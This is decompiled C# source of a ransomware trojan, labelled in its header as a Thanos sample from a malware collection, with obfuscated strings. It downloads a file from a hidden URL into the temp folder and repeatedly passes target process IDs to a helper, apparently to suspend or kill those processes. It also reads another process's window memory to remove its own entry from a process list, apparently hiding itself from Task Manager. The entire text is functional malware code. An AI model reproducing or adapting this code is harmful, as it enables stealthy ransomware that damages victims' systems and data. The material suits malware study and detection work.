// Decompiled with JetBrains decompiler
// Type: frgoWklvEOSV.PmZcbpYMQkkuHdO
// Assembly: chaddad, Version=0.0.0.0, Culture=neutral, PublicKeyToken=null
// MVID: 6BDE87D8-B0AC-468F-B40C-8A894553F651
// Assembly location: C:\Users\Administrateur\Downloads\Bazaar.2021.07-msil\HEUR-Trojan-Ransom.MSIL.Thanos.gen-66ed5384220ff3091903e14a54849f824fdd13ac70dc4e0127eb59c1de801fc2.exe

using SmartAssembly.Delegates;
using SmartAssembly.HouseOfCards;
using System;
using System.Diagnostics;
using System.IO;
using System.Net;
using System.Runtime.InteropServices;
using System.Text;
using System.Threading;

namespace frgoWklvEOSV
{
  internal sealed class PmZcbpYMQkkuHdO
  {
    private static volatile bool NPrbAlPzPDdY;
    public static volatile bool zsxmbThfoIv;
    [NonSerialized]
    internal static GetString \u0098;

    public static string swZUlVwSEWmJw()
    {
      PFruJiQrcriiZ.KtQjokjXHZXUlt = IntPtr.Size != 8 ? PmZcbpYMQkkuHdO.vmqHVeneBD(new Uri(PFruJiQrcriiZ.GwTsezEgVAuVAU(PmZcbpYMQkkuHdO.\u0098(107400566)))) : PmZcbpYMQkkuHdO.vmqHVeneBD(new Uri(PFruJiQrcriiZ.GwTsezEgVAuVAU(PmZcbpYMQkkuHdO.\u0098(107401192))));
      return PFruJiQrcriiZ.KtQjokjXHZXUlt;
    }

    public static string vmqHVeneBD([In] Uri obj0)
    {
      try
      {
        string path2 = Path.GetRandomFileName().Replace(PmZcbpYMQkkuHdO.\u0098(107400388), PmZcbpYMQkkuHdO.\u0098(107388746)).Remove(0, 3) + PmZcbpYMQkkuHdO.\u0098(107400415);
        new WebClient().DownloadFile(obj0, Path.Combine(Path.GetTempPath(), path2));
        return Path.Combine(Path.GetTempPath(), path2);
      }
      catch
      {
      }
      return string.Empty;
    }

    public static Process bZgooWszMxOy([In] string obj0)
    {
      foreach (Process process in Process.GetProcesses())
      {
        if (process.ProcessName.Contains(obj0))
          return process;
      }
      return (Process) null;
    }

    public static void xRTdqUJOGhXP([In] string[] obj0)
    {
      string MpIHQdZxSklG = PmZcbpYMQkkuHdO.swZUlVwSEWmJw();
      if (string.IsNullOrEmpty(MpIHQdZxSklG))
        return;
      while (true)
      {
        foreach (string str1 in obj0)
        {
          Process process = PmZcbpYMQkkuHdO.bZgooWszMxOy(str1);
          if (process != null)
          {
            string str2 = process.Id.ToString();
            PFruJiQrcriiZ.KXNiSRaxzeIpPt(MpIHQdZxSklG, str2 + PmZcbpYMQkkuHdO.\u0098(107386850) + Path.GetFileName(Process.GetCurrentProcess().MainModule.FileName));
            PFruJiQrcriiZ.KXNiSRaxzeIpPt(MpIHQdZxSklG, str2 + PmZcbpYMQkkuHdO.\u0098(107386850) + Path.GetFileName(Process.GetCurrentProcess().MainModule.FileName) + PmZcbpYMQkkuHdO.\u0098(107400406));
            PFruJiQrcriiZ.KXNiSRaxzeIpPt(MpIHQdZxSklG, str2 + PmZcbpYMQkkuHdO.\u0098(107386850) + PFruJiQrcriiZ.GwTsezEgVAuVAU(PmZcbpYMQkkuHdO.\u0098(107400365)));
            PFruJiQrcriiZ.KXNiSRaxzeIpPt(MpIHQdZxSklG, str2 + PmZcbpYMQkkuHdO.\u0098(107386850) + PFruJiQrcriiZ.GwTsezEgVAuVAU(PmZcbpYMQkkuHdO.\u0098(107387949)));
            PFruJiQrcriiZ.KXNiSRaxzeIpPt(MpIHQdZxSklG, str2 + PmZcbpYMQkkuHdO.\u0098(107386850) + PFruJiQrcriiZ.GwTsezEgVAuVAU(PmZcbpYMQkkuHdO.\u0098(107400372)));
            PFruJiQrcriiZ.KXNiSRaxzeIpPt(MpIHQdZxSklG, str2 + PmZcbpYMQkkuHdO.\u0098(107386850) + PFruJiQrcriiZ.GwTsezEgVAuVAU(PmZcbpYMQkkuHdO.\u0098(107400835)));
            PFruJiQrcriiZ.KXNiSRaxzeIpPt(MpIHQdZxSklG, str2 + PmZcbpYMQkkuHdO.\u0098(107386850) + PFruJiQrcriiZ.GwTsezEgVAuVAU(PmZcbpYMQkkuHdO.\u0098(107403449)));
            PFruJiQrcriiZ.KXNiSRaxzeIpPt(MpIHQdZxSklG, str2 + PmZcbpYMQkkuHdO.\u0098(107386850) + PFruJiQrcriiZ.GwTsezEgVAuVAU(PmZcbpYMQkkuHdO.\u0098(107400850)));
          }
        }
        Thread.Sleep(200);
      }
    }

    [DllImport("kernel32.dll", EntryPoint = "OpenProcess")]
    private static extern IntPtr RPEMJDxuanuQkV([In] int obj0, [In] bool obj1, [In] uint obj2);

    [DllImport("kernel32.dll", EntryPoint = "VirtualAllocEx", SetLastError = true)]
    private static extern IntPtr aiCfMgeoiuTjUMzCV(
      [In] IntPtr obj0,
      [In] IntPtr obj1,
      [In] uint obj2,
      [In] int obj3,
      [In] int obj4);

    [DllImport("kernel32.dll", EntryPoint = "VirtualFreeEx", SetLastError = true)]
    private static extern bool WltWtpWRTWkRb([In] IntPtr obj0, [In] IntPtr obj1, [In] uint obj2, [In] int obj3);

    [DllImport("kernel32.dll", EntryPoint = "CloseHandle", SetLastError = true)]
    [return: MarshalAs(UnmanagedType.Bool)]
    private static extern bool aJKVhnqZopRo(IntPtr ieOfaJizIolWkYn);

    [DllImport("kernel32.dll", EntryPoint = "WriteProcessMemory", SetLastError = true)]
    private static extern bool SZgeTgVGzNrPn(
      IntPtr uhimDKeNmQmB,
      IntPtr QKkbIiEcaFDJ,
      byte[] pNHDpIOupPgB,
      uint gpzdSQiksmHIiE,
      out UIntPtr vAUrzrCfCWv);

    [DllImport("kernel32.dll", EntryPoint = "ReadProcessMemory", SetLastError = true)]
    private static extern bool blZEwnCUkJEzY(
      IntPtr sqKIEGwqjOHW,
      IntPtr YeBimhgZRdrex,
      [Out] byte[] VdMDasJSmq,
      int GdhqiIqbxsvAnB,
      out UIntPtr EzOMAaxrSvh);

    [DllImport("user32.dll", EntryPoint = "GetWindowThreadProcessId", SetLastError = true)]
    private static extern uint HllFOTPKedY(IntPtr eUDWVbRwyKtmjb, out uint rGOQidRuPe);

    [DllImport("user32.dll", EntryPoint = "SendMessage", CharSet = CharSet.Auto)]
    private static extern IntPtr iGDyvpgeHMXCzo(
      [In] IntPtr obj0,
      [In] uint obj1,
      [In] IntPtr obj2,
      [In] IntPtr obj3);

    [DllImport("user32.dll", EntryPoint = "FindWindow", SetLastError = true)]
    private static extern IntPtr aRxibHvjXJhU([In] string obj0, [In] string obj1);

    [DllImport("user32.dll", EntryPoint = "FindWindowEx", SetLastError = true)]
    private static extern IntPtr UZszvSoVhQgbV(
      [In] IntPtr obj0,
      [In] IntPtr obj1,
      [In] string obj2,
      [In] string obj3);

    private static byte[] VpkAJizyuaj([In] object obj0)
    {
      int length = Marshal.SizeOf(obj0);
      byte[] destination = new byte[length];
      IntPtr num = Marshal.AllocHGlobal(length);
      Marshal.StructureToPtr(obj0, num, true);
      Marshal.Copy(num, destination, 0, length);
      Marshal.FreeHGlobal(num);
      return destination;
    }

    private static IntPtr rBaNxPzSfHF([In] uint obj0) => PmZcbpYMQkkuHdO.RPEMJDxuanuQkV(56, false, obj0);

    private static void YJhUDGPhSkbuEf([In] IntPtr obj0) => PmZcbpYMQkkuHdO.aJKVhnqZopRo(obj0);

    private static IntPtr YAqvBQGcLASTyDa([In] uint obj0, [In] IntPtr obj1) => PmZcbpYMQkkuHdO.aiCfMgeoiuTjUMzCV(obj1, IntPtr.Zero, obj0, 12288, 4);

    private static void THoLmeHgblkyQDl([In] IntPtr obj0, [In] IntPtr obj1, [In] uint obj2) => PmZcbpYMQkkuHdO.WltWtpWRTWkRb(obj0, obj1, obj2, 32768);

    private static IntPtr wpcUcLrVrFbBPg()
    {
      IntPtr num = PmZcbpYMQkkuHdO.aRxibHvjXJhU(PmZcbpYMQkkuHdO.\u0098(107400801), PmZcbpYMQkkuHdO.\u0098(107400776));
      return !(num == IntPtr.Zero) ? PmZcbpYMQkkuHdO.UZszvSoVhQgbV(PmZcbpYMQkkuHdO.UZszvSoVhQgbV(num, IntPtr.Zero, PmZcbpYMQkkuHdO.\u0098(107400743), (string) null), IntPtr.Zero, PmZcbpYMQkkuHdO.\u0098(107400717), PmZcbpYMQkkuHdO.\u0098(107400683)) : PmZcbpYMQkkuHdO.UZszvSoVhQgbV(PmZcbpYMQkkuHdO.UZszvSoVhQgbV(PmZcbpYMQkkuHdO.aRxibHvjXJhU(PmZcbpYMQkkuHdO.\u0098(107400743), PmZcbpYMQkkuHdO.\u0098(107400766)), IntPtr.Zero, PmZcbpYMQkkuHdO.\u0098(107400743), (string) null), IntPtr.Zero, PmZcbpYMQkkuHdO.\u0098(107400717), PmZcbpYMQkkuHdO.\u0098(107400728));
    }

    private static IntPtr VRSjNGIqMPxxrf([In] IntPtr obj0) => PmZcbpYMQkkuHdO.iGDyvpgeHMXCzo(obj0, 4100U, IntPtr.Zero, IntPtr.Zero);

    private static void sovqNCrbRXgkN([In] IntPtr obj0, [In] IntPtr obj1) => PmZcbpYMQkkuHdO.iGDyvpgeHMXCzo(obj0, 4104U, obj1, IntPtr.Zero);

    private static void FQsCBkWkZKJYOA([In] IntPtr obj0) => PmZcbpYMQkkuHdO.iGDyvpgeHMXCzo(obj0, 4124U, IntPtr.Zero, IntPtr.Zero);

    private static string MRonfAkACEl([In] IntPtr obj0, [In] IntPtr obj1)
    {
      byte[] numArray = new byte[50];
      PmZcbpYMQkkuHdO.egOYnMsXOTjl structure = new PmZcbpYMQkkuHdO.egOYnMsXOTjl();
      uint rGOQidRuPe;
      int num1 = (int) PmZcbpYMQkkuHdO.HllFOTPKedY(obj0, out rGOQidRuPe);
      IntPtr num2 = PmZcbpYMQkkuHdO.rBaNxPzSfHF(rGOQidRuPe);
      IntPtr QKkbIiEcaFDJ = PmZcbpYMQkkuHdO.YAqvBQGcLASTyDa((uint) Marshal.SizeOf<PmZcbpYMQkkuHdO.egOYnMsXOTjl>(structure), num2);
      IntPtr YeBimhgZRdrex = PmZcbpYMQkkuHdO.YAqvBQGcLASTyDa(50U, num2);
      structure.BxHIHExIvxZU = obj1;
      structure.YRofDNnXGicoWU = (IntPtr) 0;
      structure.rLBeAZCTznQk = 50U;
      structure.TDlIPygpdst = YeBimhgZRdrex;
      UIntPtr num3;
      PmZcbpYMQkkuHdO.SZgeTgVGzNrPn(num2, QKkbIiEcaFDJ, PmZcbpYMQkkuHdO.VpkAJizyuaj((object) structure), (uint) Marshal.SizeOf<PmZcbpYMQkkuHdO.egOYnMsXOTjl>(structure), out num3);
      PmZcbpYMQkkuHdO.iGDyvpgeHMXCzo(obj0, 4141U, obj1, QKkbIiEcaFDJ);
      PmZcbpYMQkkuHdO.blZEwnCUkJEzY(num2, YeBimhgZRdrex, numArray, 50, out num3);
      PmZcbpYMQkkuHdO.THoLmeHgblkyQDl(num2, QKkbIiEcaFDJ, (uint) Marshal.SizeOf<PmZcbpYMQkkuHdO.egOYnMsXOTjl>(structure));
      PmZcbpYMQkkuHdO.THoLmeHgblkyQDl(num2, YeBimhgZRdrex, 50U);
      PmZcbpYMQkkuHdO.YJhUDGPhSkbuEf(num2);
      return Encoding.ASCII.GetString(numArray);
    }

    private static void eYeipYCyEPEx([In] string obj0)
    {
      IntPtr num1 = PmZcbpYMQkkuHdO.wpcUcLrVrFbBPg();
      if (!(num1 != IntPtr.Zero))
        return;
      int num2 = (int) PmZcbpYMQkkuHdO.VRSjNGIqMPxxrf(num1);
      for (int index = 0; index < num2; ++index)
      {
        if (PmZcbpYMQkkuHdO.MRonfAkACEl(num1, (IntPtr) index).Contains(obj0))
          PmZcbpYMQkkuHdO.sovqNCrbRXgkN(num1, (IntPtr) index);
      }
    }

    private static void RkWwqjeVZT()
    {
      IntPtr num = PmZcbpYMQkkuHdO.wpcUcLrVrFbBPg();
      if (!(num != IntPtr.Zero))
        return;
      PmZcbpYMQkkuHdO.FQsCBkWkZKJYOA(num);
      PmZcbpYMQkkuHdO.FQsCBkWkZKJYOA(num);
      PmZcbpYMQkkuHdO.FQsCBkWkZKJYOA(num);
      PmZcbpYMQkkuHdO.FQsCBkWkZKJYOA(num);
      PmZcbpYMQkkuHdO.FQsCBkWkZKJYOA(num);
    }

    public static void SmzpdOGqBUsqf() => new Thread(new ThreadStart(PmZcbpYMQkkuHdO.YuQxyPaMUrM)).Start();

    private static void YuQxyPaMUrM()
    {
      while (!PmZcbpYMQkkuHdO.NPrbAlPzPDdY)
      {
        if (PmZcbpYMQkkuHdO.zsxmbThfoIv)
        {
          PmZcbpYMQkkuHdO.eYeipYCyEPEx(Process.GetCurrentProcess().ProcessName + PmZcbpYMQkkuHdO.\u0098(107400415));
          Thread.Sleep(525);
        }
        else
        {
          PmZcbpYMQkkuHdO.RkWwqjeVZT();
          Thread.Sleep(1000);
        }
      }
      PmZcbpYMQkkuHdO.NPrbAlPzPDdY = false;
    }

    static PmZcbpYMQkkuHdO()
    {
      Strings.CreateGetStringDelegate(typeof (PmZcbpYMQkkuHdO));
      PmZcbpYMQkkuHdO.NPrbAlPzPDdY = false;
      PmZcbpYMQkkuHdO.zsxmbThfoIv = true;
    }

    private struct egOYnMsXOTjl
    {
      public uint ZZFIMbxLgzthaR;
      public IntPtr BxHIHExIvxZU;
      public IntPtr YRofDNnXGicoWU;
      public uint oNjdwbdRHgy;
      public uint nmVNOKbSciLW;
      public IntPtr TDlIPygpdst;
      public uint rLBeAZCTznQk;
      public int NYhBjqLGSmMKnsl;
      public IntPtr nQYKRLEKQiaDAB;
    }
  }
}
